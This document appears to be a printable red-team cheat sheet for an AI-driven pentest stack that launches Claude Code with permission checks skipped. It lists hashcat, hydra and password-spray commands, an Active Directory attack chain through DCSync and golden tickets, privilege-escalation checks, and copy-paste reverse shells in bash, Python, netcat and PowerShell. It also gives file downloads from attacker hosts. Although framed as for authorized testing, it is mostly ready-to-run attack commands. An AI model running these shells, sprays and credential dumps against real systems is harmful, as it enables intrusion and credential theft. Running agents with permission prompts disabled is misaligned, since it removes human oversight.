# QUICK REFERENCE — April 2026 Red Team Stack
# Field cheat sheet — everything in one place
# Print this. Tape it to your monitor.

---

## STACK STARTUP

```bash
make start          # Start all 9 Docker services
make health         # Verify all services responding
claude --dangerously-skip-permissions  # Launch Claude Code
```

---

## NEW MISSION

```bash
make new-mission NAME=client TARGET=target.com TYPE=web
# Types: web | network | ad | mobile | cloud | wireless | ctf | bugbounty | osint
```

**First prompt to Claude Code:**
```
Authorized [TYPE] test. Target: [TARGET]. Scope: [SCOPE]. Auth: [REF].
Mission: [NAME]. Load appropriate playbook. PentestThinkingMCP planning first.
```

---

## MCP SHORTCUTS

| Key | Server | Best For |
|-----|--------|---------|
| `hs` | HexStrike full | Any — 150+ tools |
| `web` | HexStrike web | Web apps, bug bounty |
| `net` | HexStrike network | Port scan, AD enum |
| `kali` | Kali SSH+PTY | Manual, MSF, shells |
| `think` | PentestThinkingMCP | Attack path MCTS |
| `pgpt` | PentestGPT | CTF autopilot |
| `vuln` | VulnGPT | CVE analysis |
| `threat` | STRIDE-GPT | Threat modeling |
| `crew` | PentestAgent | Multi-agent, memory |

---

## PLAYBOOK QUICK-PICK

```
Target type          → Playbook
────────────────────────────────────────────────────────
Web application      → playbooks/web-app-full.md
Network / perimeter  → playbooks/network-pentest.md
Active Directory     → playbooks/ad-attack.md
Bug bounty           → playbooks/bug-bounty.md
CTF / HackTheBox     → playbooks/ctf-htb.md
Mobile (iOS/Android) → playbooks/mobile-pentest.md
AWS cloud            → playbooks/cloud-aws.md
GCP / Azure cloud    → playbooks/cloud-gcp-azure.md
Docker / Kubernetes  → playbooks/container-k8s.md
CI/CD pipeline       → playbooks/cicd-pipeline.md
WiFi / RF / BLE      → playbooks/wireless-rf.md
Social engineering   → playbooks/social-engineering.md
Binary RE / pwn      → playbooks/binary-re.md
Web3 / smart contract→ playbooks/web3-blockchain.md
OSINT / passive      → playbooks/autogpt-osint.md
Threat modeling      → playbooks/threatgpt-stride.md
Defensive brief      → playbooks/defensive-threat-intel.md
PentestGPT patterns  → playbooks/pentestgpt-integration.md
```

---

## SKILL QUICK-PICK

```
Task                 → Skill
────────────────────────────────────────────────────────
Recon / scan         → skills/hexstrike-recon.md
Exploitation         → skills/kali-exploitation.md
CVE analysis         → skills/vulngpt-analyzer.md
Password cracking    → skills/password-attacks.md
Report writing       → skills/report-generator.md
CTF autopilot        → skills/pentestgpt-solver.md
Background monitor   → skills/autogpt-monitor.md
Threat hunting       → skills/threat-hunt.md
```

---

## HASHCAT QUICK COMMANDS (Az's 2GB GPU)

```bash
# WPA2 — rockyou
hashcat -m 22000 hash.hc22000 rockyou.txt -w 1 -d 1 --force

# WPA2 — rockyou + rules
hashcat -m 22000 hash.hc22000 rockyou.txt -r best64.rule -w 1 -d 1 --force

# NTLM — instant
hashcat -m 1000 hashes.txt rockyou.txt -d 1 --force

# NetNTLMv2
hashcat -m 5600 hashes.txt rockyou.txt -r best64.rule -d 1 --force

# Kerberoast
hashcat -m 13100 hashes.txt rockyou.txt -r best64.rule -d 1 --force

# Mask (Company2024! pattern)
hashcat -m [MODE] hash.txt -a 3 ?u?l?l?l?l?d?d?d?d -d 1 --force

# Show cracked
hashcat -m [MODE] hash.txt --show
```

---

## NMAP ESSENTIAL FLAGS

```bash
# Fast service scan (most common)
nmap -sV -sC --open [TARGET] -oA scans/nmap_svc

# Full port scan
nmap -p- --min-rate 5000 [TARGET] -oA scans/nmap_full

# UDP top 100
nmap -sU --top-ports 100 [TARGET] -oA scans/nmap_udp

# OS detection + scripts
nmap -A --open [TARGET] -oA scans/nmap_aggr

# Internal network sweep
nmap -sn 10.10.10.0/24 -oA scans/nmap_sweep
```

---

## HYDRA QUICK COMMANDS

```bash
# SSH
hydra -L users.txt -P rockyou.txt ssh://[IP] -t 4

# HTTP POST
hydra -l admin -P rockyou.txt [IP] http-post-form '/login:user=^USER^&pass=^PASS^:F=Invalid'

# RDP
hydra -l administrator -P rockyou.txt rdp://[IP] -t 1

# SMB
hydra -L users.txt -P rockyou.txt smb://[IP]
```

---

## PASSWORD SPRAY (AD) — SAFE CADENCE

```bash
# Get lockout policy first
crackmapexec smb [DC_IP] -u any_user -p any_pass --pass-pol

# Spray — 1 password, wait 31+ min, repeat
crackmapexec smb [DC_IP] -u users.txt -p 'Welcome1' --continue-on-success | grep '+'
# wait 31 minutes
crackmapexec smb [DC_IP] -u users.txt -p '[Company]2024!' --continue-on-success | grep '+'
```

---

## AD ATTACK CHAIN

```
1. Responder (LLMNR/NBT-NS)       → NetNTLMv2 hashes
2. hashcat -m 5600                → crack → plaintext creds
3. crackmapexec smb               → validate + spray
4. impacket-GetNPUsers            → AS-REP roasting
5. impacket-GetUserSPNs           → Kerberoasting
6. BloodHound + SharpHound        → attack paths
7. impacket-secretsdump           → DCSync (if Domain Admin)
8. mimikatz lsadump::dcsync       → all hashes
9. Golden ticket                  → persistence
```

---

## LINUX PRIVESC CHECKLIST

```bash
sudo -l                              # Sudo rights
find / -perm -u=s -type f 2>/dev/null # SUID binaries
cat /etc/crontab; ls /etc/cron.*    # Cron jobs
cat /etc/passwd | grep '/bin/bash'  # Shell users
find / -writable -type f 2>/dev/null | grep -v proc # Writable files
ss -tulpn | grep LISTEN             # Open ports (internal)
ps aux | grep root                  # Root processes
env                                 # Environment variables
cat ~/.bash_history                 # History
ls -la /opt /srv /var/backups       # Non-standard dirs
```

---

## WINDOWS PRIVESC CHECKLIST

```powershell
whoami /priv                        # Token privileges
whoami /groups                      # Group membership
net user [username]                 # User details
net localgroup administrators       # Local admins
systeminfo | findstr /B /C:"OS"    # OS version
wmic service list brief             # Services
schtasks /query /fo csv            # Scheduled tasks
dir C:\ /a                         # Root directory
reg query HKLM\SOFTWARE\Policies   # Group policies
```

---

## COMMON REVERSE SHELLS

```bash
# Bash
bash -i >& /dev/tcp/[IP]/4444 0>&1

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("[IP]",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat (with -e)
nc -e /bin/sh [IP] 4444

# Netcat (without -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc [IP] 4444 >/tmp/f

# PowerShell
powershell -nop -c "$client = New-Object Net.Sockets.TCPClient('[IP]',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## LISTENER SETUP

```bash
# Netcat
nc -lvnp 4444

# MSF multi-handler
use exploit/multi/handler
set payload linux/x64/shell_reverse_tcp  # or windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run -j

# Upgrade shell to fully interactive
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# press Enter twice
export TERM=xterm
```

---

## FILE TRANSFERS

```bash
# FROM attacker TO target
# Python HTTP server (attacker side)
python3 -m http.server 80

# Download on target (Linux)
wget http://[ATTACKER]/file -O /tmp/file
curl http://[ATTACKER]/file -o /tmp/file

# Download on target (Windows)
certutil -urlcache -f http://[ATTACKER]/file C:\Windows\Temp\file
powershell -c "Invoke-WebRequest 'http://[ATTACKER]/file' -OutFile 'C:\Temp\file'"
iwr http://[ATTACKER]/file -o C:\Temp\file

# Netcat transfer
# Sender: nc -w3 [TARGET] 4444 < file
# Receiver: nc -lvnp 4444 > file
```

---

## MAKE COMMANDS REFERENCE

```
make start          Start all Docker services
make stop           Stop all services
make health         Check all services
make kali-shell     Interactive Kali shell
make new-mission    Create engagement (NAME= TARGET= TYPE=)
make report         Copy report template (MISSION=)
make ctf            CTF quick start (IP= NAME=)
make osint          OSINT quick start (TARGET= MISSION=)
make backup         Encrypt + archive loot (MISSION= or --all)
make rotate-tokens  Rotate all API tokens
make update         Update all repos + tools
make clean-loot     Secure delete mission (MISSION=)
```

---

## COST REFERENCE

| Task | Model | Est. Cost |
|------|-------|-----------|
| Initial planning | Sonnet | $0.05-0.20 |
| Web app scan analysis | Sonnet | $0.10-0.50 |
| Full engagement orchestration | Sonnet | $2-15 |
| CTF machine (PentestGPT) | Sonnet | $1-5 |
| Report writing | Opus | $0.50-2.00 |
| CVE sweep (VulnGPT) | Sonnet | $0.05-0.15 |
| Overnight OSINT (AutoGPT+DeepSeek) | DeepSeek | $0.20-1.00 |

---

## EMERGENCY CONTACTS

```
# Add before engagement start:
Client contact: [NAME] [PHONE]
Emergency stop: [NAME] [PHONE]
Scope clarification: [EMAIL]
Legal counsel: [NAME] [PHONE]

# Get out of jail letter: loot/[MISSION]/auth_letter.pdf
```

---

*April 2026 | Authorized testing only | 0x4m4/april-redteam-2026*
